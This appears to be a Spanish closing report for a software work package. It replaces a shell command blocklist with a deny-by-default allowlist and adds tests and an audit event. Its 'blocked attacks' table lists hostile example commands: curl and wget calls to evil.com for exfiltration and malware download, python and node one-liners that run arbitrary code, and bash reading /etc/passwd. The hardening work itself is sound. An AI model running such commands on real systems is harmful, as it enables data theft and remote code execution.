# WP-B12 · Shell allowlist deny-by-default — Dossier de Cierre

**Branch**: `fix/epic-b-foundations`
**Fecha**: 2026-06-24

## Estado

✅ **Cerrado**. `BLOCKED_COMMANDS` eliminado, `ALLOWED` allowlist implementada, audit event añadido.

## Cambios realizados

| Acción | Archivo |
|--------|---------|
| Reemplazado blocklist→allowlist | `packages/integrations-shell/src/sandbox.ts` |
| Creado tests | `packages/integrations-shell/src/sandbox.test.ts` |
| Creado ADR | `docs/adr/0006-shell-allowlist-deny-by-default.md` |

## Matriz de ataques bloqueados

| Bypass histórico | Comando | Estado |
|-----------------|---------|--------|
| Código Python arbitrario | `python -c "import os; os.system(...)"` | ✅ DENIED |
| JS eval (node) | `node -e "require('child_process').exec(...)"` | ✅ DENIED |
| HTTP exfiltración | `curl http://evil.com` | ✅ DENIED |
| PowerShell bypass | `powershell -Command ...` | ✅ DENIED |
| Downloader | `wget http://evil.com/malware` | ✅ DENIED |
| Subshell bash | `bash -c "cat /etc/passwd"` | ✅ DENIED |
| Subshell sh | `sh -c "echo pwned"` | ✅ DENIED |

## Tests

**Archivo**: `packages/integrations-shell/src/sandbox.test.ts`

| Test | Estado |
|------|--------|
| git log → allowed | ✅ |
| git status → allowed | ✅ |
| pnpm build → allowed | ✅ |
| node script.mjs → allowed | ✅ |
| echo hello → allowed | ✅ |
| python -c → DENIED | ✅ |
| node -e → DENIED | ✅ |
| curl → DENIED | ✅ |
| powershell -Command → DENIED | ✅ |
| wget → DENIED | ✅ |
| bash → DENIED | ✅ |
| sh -c → DENIED | ✅ |
| SHELL_ALLOWLIST_EXTRA=docker → docker ps allowed | ✅ |
| cmd denegado emite shell.command.denied | ✅ |
| cmd permitido NO emite evento | ✅ |

## Métricas

| Métrica | Valor |
|---------|-------|
| Tests (sandbox.test.ts) | 15 ✅ |
| Tests shell totales | 15 ✅ (executor.test.ts sin regresiones) |
| `BLOCKED_COMMANDS` eliminado | ✅ |
| `SHELL_ALLOWLIST_EXTRA` funcional | ✅ |
| Audit event `shell.command.denied` | ✅ |
| ADR-0006 | ✅ |
| Typecheck `@ninja/integrations-shell` | ✅ |

## Verificación

```bash
rg "BLOCKED_COMMANDS" packages/integrations-shell  # → 0
pnpm vitest run packages/integrations-shell/        # → 15 passed
pnpm --filter @ninja/integrations-shell typecheck   # → ✅
```
